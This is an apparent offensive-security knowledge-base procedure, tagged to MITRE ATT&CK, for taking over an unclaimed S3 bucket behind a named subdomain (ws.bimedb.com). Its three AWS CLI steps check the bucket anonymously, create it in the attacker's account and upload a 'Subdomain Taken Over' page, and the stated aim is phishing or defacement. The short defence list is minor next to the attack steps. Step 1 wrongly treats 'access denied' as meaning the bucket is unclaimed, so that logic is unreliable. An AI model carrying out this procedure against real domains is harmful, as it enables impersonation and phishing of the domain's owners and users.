---
id: proc-uuid-2
tags:
  - s3-takeover
  - aws
  - cloud
type: procedure
tools:
  - '[[tools/aws-cli]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/aws-s3-ls-check]]'
  - '[[commands/aws-s3-mb-create]]'
  - '[[commands/aws-s3-cp-upload]]'
verified: false
platforms:
  - AWS
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T05:32:23.776Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Verify-and-Claim-Unclaimed-S3-Bucket

## Summary

This procedure verifies if an AWS S3 bucket referenced by a subdomain's CNAME is unclaimed and then claims it by creating the bucket in the attacker's AWS account, allowing control over the subdomain for malicious purposes.

## Description

Subdomain takeovers occur when DNS records point to unowned cloud buckets. This procedure checks bucket accessibility without authentication (indicating it's unclaimed) and then registers it under the attacker's account. Once claimed, the attacker can host phishing pages or deface the site. Prerequisites include an AWS account and CLI setup; outcomes enable impersonation of the legitimate domain.

## Requirements

1. AWS account with permissions to create S3 buckets
2. AWS CLI installed and configured with access keys
3. Bucket name derived from DNS CNAME (e.g., ws-bimedb-com)

## Defense

Defensive measures and detection strategies:

- Implement bucket naming policies to prevent squatting
- Use AWS Config rules to alert on unclaimed buckets
- Scan for dangling DNS records with tools like dnsrecon

## Objectives

1. Confirm the bucket is unclaimed and accessible
2. Take ownership by creating the bucket
3. Demonstrate control by hosting content

## Instructions

### Step 1: Check Bucket Status

**Context**: Attempt to list the bucket anonymously to see if it's unclaimed.

**Command** ([[commands/aws-s3-ls-check]]):
```bash
aws s3 ls s3://ws-bimedb-com --no-sign-request
```

> If the bucket doesn't exist or access is denied without creds, it's unclaimed. Expected output: Error like "NoSuchBucket".

### Step 2: Create the Bucket

**Context**: Claim the bucket by creating it in your account.

**Command** ([[commands/aws-s3-mb-create]]):
```bash
aws s3 mb s3://ws-bimedb-com
```

> This creates the bucket. Expected output: "make_bucket: ws-bimedb-com".

### Step 3: Upload Test Content

**Context**: Verify control by uploading and serving a file via the subdomain.

**Command** ([[commands/aws-s3-cp-upload]]):
```bash
echo '<h1>Subdomain Taken Over</h1>' > test.html
aws s3 cp test.html s3://ws-bimedb-com/
```

> Uploads the file. Expected output: "upload: test.html to s3://ws-bimedb-com/test.html". Browse to http://ws.bimedb.com/test.html to confirm.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques

- None

## Commands Used

- [[commands/aws-s3-ls-check]]
- [[commands/aws-s3-mb-create]]
- [[commands/aws-s3-cp-upload]]

## Tools Used

- [[tools/aws-cli]]

## Tags

- [[s3-takeover]]
- [[aws-cloud]]
